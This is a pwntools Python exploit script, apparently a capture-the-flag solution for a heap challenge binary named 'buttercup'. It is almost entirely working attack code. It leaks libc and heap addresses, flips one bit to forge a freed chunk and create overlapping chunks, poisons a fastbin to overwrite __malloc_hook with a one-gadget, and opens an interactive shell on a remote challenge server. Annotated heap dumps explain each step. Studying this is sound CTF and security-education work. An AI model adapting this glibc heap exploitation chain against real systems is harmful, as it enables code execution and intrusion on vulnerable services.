from pwn import *

def alloc(size, idx):
	r.sendlineafter('>> ', '1')
	r.sendlineafter('input\n', str(size))
	r.sendlineafter('index\n', str(idx))
	return

def free(idx):
	r.sendlineafter('>> ', '2')
	r.sendlineafter('index\n', str(idx))
	return

def edit(idx, data):
	r.sendlineafter('>> ', '3')
	r.sendlineafter('index\n', str(idx))
	r.send(data)

def craft(idx, data):
	r.sendlineafter('>> ', '3')
	r.sendlineafter('index\n', str(idx))
	r.sendline(data)

def libcLeak():
	r.sendlineafter('>> ', '4')
	r.recvuntil('0 => ')
	return u64(r.recv(6).ljust(8, '\x00'))

def heapLeak():
	r.sendlineafter('>> ', '4')
	r.recvuntil('2 => ')
	return u64(r.recv(6).ljust(8, '\x00'))

def flip(addr):
	r.sendlineafter('>> ', '1337')
	r.sendlineafter('Address : ', addr)

def pwn():

	alloc(0x88, 0)
	alloc(0x68, 1)
	alloc(0x68, 2)	
	alloc(0x88, 3)
	# Prevent top chunk consolidation
	alloc(0x68, 4)	

	
	free(0)

	alloc(0x88, 0)

	libc    = libcLeak() - 0x3c4b78
	mhook   = libc + 0x3c4b10
	oneshot = libc + 0xf1117
	log.success("Libc:          0x{:x}".format(libc))
	log.success("__malloc_hook: 0x{:x}".format(mhook))
	
	# We can get a heap leak by free-ing two fast chunk
	free(1)
	free(2)

	"""
		(0x20)     fastbin[0]: 0x0
		(0x30)     fastbin[1]: 0x0
		(0x40)     fastbin[2]: 0x0
		(0x50)     fastbin[3]: 0x0
		(0x60)     fastbin[4]: 0x0
		(0x70)     fastbin[5]: 0x555555757200 --> 0x555555757190 --> 0x0
		(0x80)     fastbin[6]: 0x0
                  		  top: 0x555555757300 (size : 0x20d00) 
       		   last_remainder: 0x0 (size : 0x0) 
	                unsortbin: 0x0
	"""

	alloc(0x68, 2)

	"""
		0x555555757100:	0x0000000000000000	0x0000000000000091 <-- chunk 0 (in use)
		0x555555757110:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
		0x555555757120:	0x0000000000000000	0x0000000000000000
		0x555555757130:	0x0000000000000000	0x0000000000000000
		0x555555757140:	0x0000000000000000	0x0000000000000000
		0x555555757150:	0x0000000000000000	0x0000000000000000
		0x555555757160:	0x0000000000000000	0x0000000000000000
		0x555555757170:	0x0000000000000000	0x0000000000000000
		0x555555757180:	0x0000000000000000	0x0000000000000000
		0x555555757190:	0x0000000000000090	0x0000000000000071 <-- chunk 1 (free)
		0x5555557571a0:	0x0000000000000000	0x0000000000000000
		0x5555557571b0:	0x0000000000000000	0x0000000000000000
		0x5555557571c0:	0x0000000000000000	0x0000000000000000
		0x5555557571d0:	0x0000000000000000	0x0000000000000000
		0x5555557571e0:	0x0000000000000000	0x0000000000000000
		0x5555557571f0:	0x0000000000000000	0x0000000000000000
		0x555555757200:	0x0000000000000000	0x0000000000000071 <-- chunk 2
		0x555555757210:	0x0000555555757190	0x0000000000000000
	"""

	heap   = heapLeak() & 0xFFFFFFFFFFFFF000
	target = heap + 0x278
	log.success("Heap:          0x{:x}".format(heap))

	edit(2, p64(0)*12 + p64(0x170))
	
	free(0)

	# Flip the bit and fool the chunk that its
	# previous chunk is free'd so that we can overlap
	flip(str(target))
	"""
		0x555555757100:	0x0000000000000000	0x0000000000000091 <-- chunk 0 (free)
		0x555555757110:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
		0x555555757120:	0x0000000000000000	0x0000000000000000
		0x555555757130:	0x0000000000000000	0x0000000000000000
		0x555555757140:	0x0000000000000000	0x0000000000000000
		0x555555757150:	0x0000000000000000	0x0000000000000000
		0x555555757160:	0x0000000000000000	0x0000000000000000
		0x555555757170:	0x0000000000000000	0x0000000000000000
		0x555555757180:	0x0000000000000000	0x0000000000000000
		0x555555757190:	0x0000000000000090	0x0000000000000070 <-- chunk 1 (free)
		0x5555557571a0:	0x0000000000000000	0x0000000000000000
		0x5555557571b0:	0x0000000000000000	0x0000000000000000
		0x5555557571c0:	0x0000000000000000	0x0000000000000000
		0x5555557571d0:	0x0000000000000000	0x0000000000000000
		0x5555557571e0:	0x0000000000000000	0x0000000000000000
		0x5555557571f0:	0x0000000000000000	0x0000000000000000
		0x555555757200:	0x0000000000000000	0x0000000000000071 <-- chunk 2 (in use)
		0x555555757210:	0x0000000000000000	0x0000000000000000
		0x555555757220:	0x0000000000000000	0x0000000000000000
		0x555555757230:	0x0000000000000000	0x0000000000000000
		0x555555757240:	0x0000000000000000	0x0000000000000000
		0x555555757250:	0x0000000000000000	0x0000000000000000
		0x555555757260:	0x0000000000000000	0x0000000000000000
		0x555555757270:	0x0000000000000170	0x0000000000000090 <-- chunk 3 (in use & previous chunk at 0x555555757100)
	"""
	free(3)

	"""
		0x555555757100:	0x0000000000000000	0x0000000000000201 <-- coalesced chunk (big enough to overlap)
		0x555555757110:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
		0x555555757120:	0x0000000000000000	0x0000000000000000
		0x555555757130:	0x0000000000000000	0x0000000000000000
		0x555555757140:	0x0000000000000000	0x0000000000000000
		0x555555757150:	0x0000000000000000	0x0000000000000000
		0x555555757160:	0x0000000000000000	0x0000000000000000
		0x555555757170:	0x0000000000000000	0x0000000000000000
		0x555555757180:	0x0000000000000000	0x0000000000000000
		0x555555757190:	0x0000000000000090	0x0000000000000070 <-- chunk 1 (free)
	"""

	# Now we can overwrite the fastbin's FD with __malloc_hook
	alloc(0x100, 5)

	edit(5, p64(0)*16 + p64(0x70)*2 + p64(mhook-0x30+0xd))

	"""
		0x555555757100:	0x0000000000000000	0x0000000000000111 <-- chunk 5
		0x555555757110:	0x0000000000000000	0x0000000000000000
		0x555555757120:	0x0000000000000000	0x0000000000000000
		0x555555757130:	0x0000000000000000	0x0000000000000000
		0x555555757140:	0x0000000000000000	0x0000000000000000
		0x555555757150:	0x0000000000000000	0x0000000000000000
		0x555555757160:	0x0000000000000000	0x0000000000000000
		0x555555757170:	0x0000000000000000	0x0000000000000000
		0x555555757180:	0x0000000000000000	0x0000000000000000
		0x555555757190:	0x0000000000000070	0x0000000000000070 <-- chunk 1 (free & overlapped)
		0x5555557571a0:	0x00007ffff7dd1aed	0x0000000000000000
	"""

	# malloc will return 0x555555757190
	alloc(0x68, 6)
	# malloc will return 0x00007ffff7dd1aed
	alloc(0x68, 7)
	# __malloc_hook => one gadget
	edit(7,"H"*0x13+p64(oneshot))
	
	# Trigger __malloc_hook
	r.sendlineafter('>> ', '1')
	r.sendlineafter('input\n', '10')

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if sys.argv[1] == "r":
        r = remote('35.196.53.165', 1337)
        pwn()
    else:
        r = process('./buttercup')
        pause()
        pwn()
